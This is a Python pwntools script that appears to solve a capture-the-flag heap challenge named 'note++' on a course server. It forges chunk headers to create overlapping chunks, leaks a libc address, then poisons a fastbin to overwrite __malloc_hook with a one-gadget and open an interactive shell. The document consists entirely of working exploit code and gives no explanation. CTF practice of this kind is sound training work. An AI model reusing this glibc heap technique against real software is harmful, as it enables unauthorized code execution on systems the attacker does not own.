from pwn import *

local = False
elf = 'note++' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "edu-ctf.csie.org"
    port = 10181
    r = remote(ip,port)

context.arch = 'amd64'
l = ELF('./libc-2.23.so')

def add( size , Note ,note):
	r.sendafter( '>' , '1' )
	r.sendafter( 'Size: ' , str(size) )
	r.sendafter( 'Note: ' , Note )
	r.sendlineafter( 'note: ' , note )

def show( ):
	r.sendafter( '>' , '2' )
	r.recv()

def delete( index ):
	r.sendafter( '>' , '3' )
	r.sendafter( 'Index: ' , str(index) )

raw_input("aaa")
# add size <= 120
add( 0 , '0' , 'a'*47 ) #0
add( 0x58 , '1' , 'd'*47 ) #1
add( 0x58 , '2' , 'd'*47 ) #2
add( 0 , '3' , 'a'*47 ) #3
add( 0 , '4' , 'a'*47 ) #4
add( 0x68 , '5' , 'a'*47 ) #5
add( 0 , '6' , 'a' ) #6

delete(0)
add(0, 'a'*16 + '\0'*8 + p64(0xc1),'a')
delete(1)
delete(0)
add(0, 'w' * 32,'a')
r.sendafter( '>' , '2' )
r.recvuntil( 'w' * 32 )
l.address = u64(r.recv(6) + '\0\0') - 3951480
success("libc -> %s",hex(l.address))
success("__malloc_hook -> %s",hex(l.sym.__malloc_hook))
delete(5)
delete(4)
add(0, 'q'*16 + '\0'*8 + p64(0x71) + p64(l.sym.__malloc_hook - 0x10 -3 ) ,'a')
add(0x68 , 'a' , 'a')
onegadget = l.address + 0xf02a4
success("onegadget -> %s",hex(onegadget))
add(0x68 , 'aaa'+ p64(onegadget) , 'a' )
delete(0)
r.interactive()

